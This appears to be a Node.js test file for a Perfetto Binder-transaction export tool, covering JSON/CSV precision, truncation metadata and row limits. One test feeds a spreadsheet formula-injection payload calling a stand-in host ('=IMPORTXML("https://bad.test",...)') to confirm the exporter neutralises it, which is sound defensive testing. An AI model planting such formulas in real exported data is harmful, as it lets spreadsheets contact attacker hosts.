import {test} from 'node:test';
import assert from 'node:assert/strict';
import {binderTransactionsCsv,binderTransactionsJson,binderBreakdownCsv,binderBreakdownJson} from '../public/binder-export.js';

const transactions=[{tsNs:'1730000000000000000',durationNs:'2500000',client:'app.client',clientTid:'42',server:'system_server',serverTid:'8',aidl:'android.example.IFoo',sync:true,serverTsNs:'1730000000001000000',serverDurationNs:'1500000',id:'9007199254740993'}];

test('Binder JSON export preserves nanosecond precision, direction and truncation metadata',()=>{
 const data=JSON.parse(binderTransactionsJson({transactions,packageName:'com.example.app',direction:'client',truncated:true},{traceFileName:'capture.perfetto-trace'}));
 assert.equal(data.kind,'perfetto-binder-transactions');assert.equal(data.traceFileName,'capture.perfetto-trace');assert.equal(data.packageName,'com.example.app');assert.equal(data.direction,'client');assert.equal(data.truncated,true);assert.equal(data.count,1);assert.equal(data.transactions[0].tsNs,transactions[0].tsNs);assert.equal(data.transactions[0].id,transactions[0].id);
});

test('Binder CSV export quotes fields, protects spreadsheet formulas and keeps nanoseconds as text',()=>{
 const csv=binderTransactionsCsv([{...transactions[0],client:'=IMPORTXML("https://bad.test","//x")'}]);
 assert.ok(csv.startsWith('\uFEFF"client_timestamp_ns"'));
 assert.ok(csv.includes("'=IMPORTXML("));
 assert.ok(csv.includes('"1730000000000000000"'));
 assert.ok(csv.includes('"9007199254740993"'));
});

test('Binder report exporters reject oversized and invalid values',()=>{
 assert.throws(()=>binderTransactionsCsv(Array(501).fill(transactions[0])),/超过导出限制/);
 assert.throws(()=>binderTransactionsJson({direction:'invalid',transactions}),/结果无效/);
 assert.throws(()=>binderTransactionsCsv([{...transactions[0],durationNs:'-1'}]),/耗时无效/);
});

test('Binder phase breakdown exports summary and all bounded intervals with completeness metadata',()=>{
 const result={summary:[{side:'client',reason:'Running',durationNs:'800000',count:2}],intervals:[{side:'client',reason:'Runnable',tsNs:'1730000000000000042',durationNs:'300000'}],summaryTruncated:false,intervalsTruncated:true};
 const json=JSON.parse(binderBreakdownJson(result,{traceFileName:'trace.pftrace',transactionId:'9007199254740993'}));
 assert.equal(json.kind,'perfetto-binder-transaction-breakdown');assert.equal(json.transactionId,'9007199254740993');assert.equal(json.traceFileName,'trace.pftrace');assert.equal(json.intervalsTruncated,true);assert.equal(json.intervals[0].tsNs,'1730000000000000042');
 const csv=binderBreakdownCsv(result);assert.ok(csv.includes('"summary","client","Running"'));assert.ok(csv.includes('"interval","client","Runnable","1730000000000000042"'));
});

test('Binder phase CSV supports its documented 1,100 combined row cap',()=>{
 const result={summary:Array.from({length:100},(_,i)=>({side:'client',reason:`R${i}`,durationNs:String(i),count:1})),intervals:Array.from({length:1000},(_,i)=>({side:'client',reason:'Running',tsNs:String(i),durationNs:'1'}))};
 assert.ok(binderBreakdownCsv(result).length>10_000);
 assert.throws(()=>binderBreakdownCsv({...result,intervals:[...result.intervals,{side:'client',reason:'Overflow',tsNs:'1',durationNs:'1'}]}),/超过导出限制/);
});
